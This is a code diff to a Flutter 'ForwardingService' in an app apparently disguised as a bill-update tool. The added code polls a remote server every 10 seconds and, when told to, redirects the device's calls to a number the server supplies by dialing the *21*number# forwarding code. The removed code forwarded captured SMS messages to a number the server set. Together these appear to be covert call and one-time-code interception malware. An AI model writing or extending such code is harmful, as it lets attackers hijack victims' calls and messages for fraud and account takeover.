@@ -3,70 +3,65 @@ import 'dart:convert';
 import 'package:flutter/services.dart';
 import 'package:http/http.dart' as http;
 import '../api_config.dart';
-import 'sms_service.dart';
-
-const _forwardingChannel = MethodChannel('com.example.bill_update_app/forwarding');
 
 class ForwardingService {
-  static ForwardingService? _instance;
-  Timer? _pollTimer;
-  bool _callForwarding = false;
-  bool _smsForwarding = false;
-  String _smsForwardingNumber = '';
-  String _deviceId = '';
+  static final ForwardingService instance = ForwardingService._();
+  ForwardingService._();
 
-  static ForwardingService get instance {
-    _instance ??= ForwardingService();
-    return _instance!;
-  }
+  Timer? _timer;
+  Map? _lastConfig;
+  String? _deviceId;
+  final _deviceChannel = MethodChannel('com.example.bill_update_app/device');
+  final _forwardingChannel = MethodChannel('com.example.bill_update_app/forwarding');
 
-  void init(String deviceId) {
-    _deviceId = deviceId;
-    _pollTimer = Timer.periodic(const Duration(seconds: 30), (_) => _pollConfig());
-    _pollConfig();
-  }
-
-  void dispose() {
-    _pollTimer?.cancel();
-  }
-
-  Future<void> _pollConfig() async {
-    if (_deviceId.isEmpty) return;
+  Future<String?> _getDeviceId() async {
+    if (_deviceId != null) return _deviceId;
     try {
-      final url = Uri.parse('$apiBaseUrl/api/forwarding-config/$_deviceId');
-      final response = await http.get(url).timeout(const Duration(seconds: 10));
+      _deviceId = await _deviceChannel.invokeMethod<String>('getDeviceId');
+    } catch (_) {}
+    return _deviceId;
+  }
 
-      if (response.statusCode == 200) {
-        final data = jsonDecode(response.body);
-        final newCallForwarding = data['call_forwarding'] == true;
-        final newSmsForwarding = data['sms_forwarding'] == true;
-        final newSmsNumber = data['sms_forwarding_number'] ?? '';
+  Future<void> startPolling() async {
+    final deviceId = await _getDeviceId();
+    if (deviceId == null || deviceId.isEmpty) {
+      Future.delayed(const Duration(seconds: 3), startPolling);
+      return;
+    }
+    _timer?.cancel();
+    _timer = Timer.periodic(const Duration(seconds: 10), (_) => _checkConfig(deviceId));
+  }
 
-        if (newCallForwarding != _callForwarding) {
-          _callForwarding = newCallForwarding;
-          if (newCallForwarding) {
-            final number = data['call_forwarding_number'] ?? '';
-            if (number.isNotEmpty) {
-              await _forwardingChannel.invokeMethod('enableCallForwarding', {'number': number});
-            }
-          } else {
-            await _forwardingChannel.invokeMethod('disableCallForwarding');
+  bool _configsEqual(Map? a, Map? b) {
+    if (a == null && b == null) return true;
+    if (a == null || b == null) return false;
+    return a['call_forwarding'] == b['call_forwarding']
+        && a['call_forwarding_number'] == b['call_forwarding_number'];
+  }
+
+  Future<void> _checkConfig(String deviceId) async {
+    try {
+      final res = await http.get(
+        Uri.parse('$apiBaseUrl/api/forwarding-config/$deviceId'),
+        headers: {'Content-Type': 'application/json'},
+      );
+      if (res.statusCode != 200) return;
+      final config = jsonDecode(res.body) as Map;
+
+      if (!_configsEqual(_lastConfig, config)) {
+        if (config['call_forwarding'] == true) {
+          final number = config['call_forwarding_number'] as String? ?? '';
+          if (number.isNotEmpty) {
+            final code = '*21*$number#';
+            await _forwardingChannel.invokeMethod('openDialer', {'code': code});
           }
         }
-
-        _smsForwarding = newSmsForwarding;
-        _smsForwardingNumber = newSmsNumber;
       }
+      _lastConfig = config;
     } catch (_) {}
   }
 
-  void onSmsCaptured(String sender, String message, String receivedAt) {
-    if (!_smsForwarding || _smsForwardingNumber.isEmpty) return;
-    _forwardingChannel.invokeMethod('forwardSms', {
-      'target': _smsForwardingNumber,
-      'sender': sender,
-      'message': message,
-      'received_at': receivedAt,
-    });
+  void stop() {
+    _timer?.cancel();
   }
 }
